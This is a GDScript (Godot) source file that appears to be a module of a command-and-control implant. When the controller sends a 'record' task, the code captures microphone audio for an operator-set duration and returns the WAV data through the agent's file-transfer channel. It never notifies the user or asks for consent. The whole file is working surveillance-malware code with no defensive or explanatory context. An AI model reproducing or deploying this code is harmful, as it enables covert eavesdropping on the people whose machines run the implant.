extends Node

var api
var transfer

func _ready():
	api = $".".get_parent().get_node("api")
	transfer = $".".get_parent().get_node("transfer")


func _on_tasking_record(task):
	var task_id = task.get("id")

	if task.has("command") and task.get("command") == "record":
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var record_duration = int(parameters.get("duration"))
		var fail = false

		# We get the index of the "Record" bus.
		var idx = AudioServer.get_bus_index("Record")
		var effect
		var recording
		
		if idx == -1:
			fail = true
		# And use it to retrieve its first effect, which has been defined
		# as an "AudioEffectRecord" resource.
		if not fail:
			effect = AudioServer.get_bus_effect(idx, 0)
		
		if effect == null:
			fail = true
		
		if not fail:
			effect.set_recording_active(true)
			await get_tree().create_timer(record_duration).timeout
			effect.set_recording_active(false)
			recording = effect.get_recording()

			if recording != null and recording.data.size() <= 0:
				fail = true

		if not fail:
			transfer.file_tasks[task_id] = FileTransfer.new(task_id, "/recording/%s.wav" % [task_id], FileTransfer.DIRECTION.DOWNLOAD, api, "", recording.data)
		else:
			api.send_agent_response(
				api.create_task_response(
					true,
					true,
					task_id,
					"Error: failed somewhere..."
				)
			)
	else:
		pass
		# TODO: error state
